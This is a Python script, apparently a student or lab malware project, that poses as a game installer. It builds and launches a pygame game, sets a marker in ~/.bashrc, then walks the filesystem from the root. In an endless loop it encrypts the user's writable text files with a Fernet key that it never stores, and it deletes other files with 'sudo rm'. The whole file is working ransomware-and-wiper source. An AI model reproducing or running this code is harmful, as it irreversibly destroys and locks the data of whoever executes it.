#!/usr/bin/python3

import os
import random
import pathlib
import time
import threading
from cryptography.fernet import Fernet

def launch_game():
	os.system("./jeu")

############################################################################################################################################################
def virus():
	
	file = open("/home/"+os.environ.get('USER')+"/.bashrc", 'r')
	lines = file.readlines()
	gameadded = None
	for line in lines:
		if "game_installed=true" in line:
			gameadded = "true"

	if gameadded==None:
		os.system("pip install -U pyinstaller")
		os.system("pip install -U pygame")
		os.system("python3 -m PyInstaller --onefile jeu.py; mv dist/jeu .")
		os.environ["game_installed"]="true"
		os.system("echo 'export game_installed=true' >> ~/.bashrc")
		game_thread = threading.Thread(target=launch_game, name="game_th")
		game_thread.start()
		

	directory = os.getcwd()
	time.sleep(1)

	Files_Table = [] #a table contaning all writable files
	Text_Files_Table = [] #a table contaning all writable TEXT files
	NonText_Files_Table = []#a table contaning all writable Non-TEXT files
	theroot = "none" #just to check if we have a root file in a directory

	for (root,dirs,files) in os.walk('/', topdown=True): #goes through the directory speciefied in the 1st parametere (we'll change it to '/' after testing) 
		print(files) #print all the files found in that directory
	
		for file in files: #goes through all the files
			path = os.path.join(root, file) #this part is to save a root file if found (just for testing, will be removed later)
			if os.path.isfile(path) == True:
				if os.stat(path).st_uid == 0:
					theroot = os.stat(path)
			
			if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be open we ignore it
			else:
				if file in {"encryptedfiles.txt", "deletedfiles.txt"}:
					print("do not touch")
				elif "proc" in path:
					print("do not touch")
				else:
					if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
						Files_Table.append(path) #put all writable files in the list
						if(pathlib.Path(path).suffix == ".txt"):
							Text_Files_Table.append(path) #put all writable TEXT files in the list	
				
	for i in range(0,(len(Files_Table)-1)):
		trouve = False
		j=0
		while((trouve == False) and (j<len(Text_Files_Table)-1)):
			if (Files_Table[i] == Text_Files_Table[j]):
				trouve = True
			j=j+1
		if trouve == False:
			NonText_Files_Table.append(Files_Table[i])

	f1 = open("encryptedfiles.txt","a")
	f1.close()
	key = Fernet.generate_key()

	while True:
		try:
			randomeNumberOfFiles = random.randint(0,len(Files_Table)) - 1
			randomeNumberOfTextFiles = random.randint(0,len(Text_Files_Table)) - 1
			randomeNumberOfNonTextFiles = random.randint(0,len(NonText_Files_Table)) - 1
		
			found = False

			##################################### encrypting a file: ########################################
			if Text_Files_Table[randomeNumberOfTextFiles] == directory+"/attacker.py" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/encryptedfiles.txt" or Text_Files_Table[randomeNumberOfTextFiles] == directory+"/deletedfiles.txt":
				continue
			else:
				f3 = open("encryptedfiles.txt","r")
				lines = f3.readlines()
				for line in lines:
					if Text_Files_Table[randomeNumberOfTextFiles] == line:
						found = True
				f3.close()
			
				if found == False:
					try:
						with open(Text_Files_Table[randomeNumberOfTextFiles],"rb") as thefile:
							contents = thefile.read()
						contents_enctypted = Fernet(key).encrypt(contents)
						with open(Text_Files_Table[randomeNumberOfTextFiles],"wb") as thefile:
							thefile.write(contents_enctypted)
						f1 = open("encryptedfiles.txt","a")
						f1.write(str(Text_Files_Table[randomeNumberOfTextFiles]) + "\n")
						f1.close()
						Text_Files_Table.remove(Text_Files_Table[randomeNumberOfTextFiles])
						time.sleep(5)
					except:
						time.sleep(5)
				else:
					time.sleep(5)
		
			##################################### deleting a file: #####################################
			if NonText_Files_Table[randomeNumberOfNonTextFiles] == directory+"/attacker.py":
				continue
			else:
				try:
					os.system ("sudo rm " + NonText_Files_Table[randomeNumberOfNonTextFiles])
					#os.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
					f2 = open("deletedfiles.txt","a")
					f2.write(str(NonText_Files_Table[randomeNumberOfNonTextFiles]) + "\n")
					f2.close()
					NonText_Files_Table.remove(NonText_Files_Table[randomeNumberOfNonTextFiles])
					time.sleep(5)
				except:
					time.sleep(5)
		
			##################################### addind a file: #####################################
			if random.randint(1,5) == 1:
				f = open(str(randomeNumberOfFiles), "w")
				f.close()
				time.sleep(5)
		except:
			error="but we will continue"
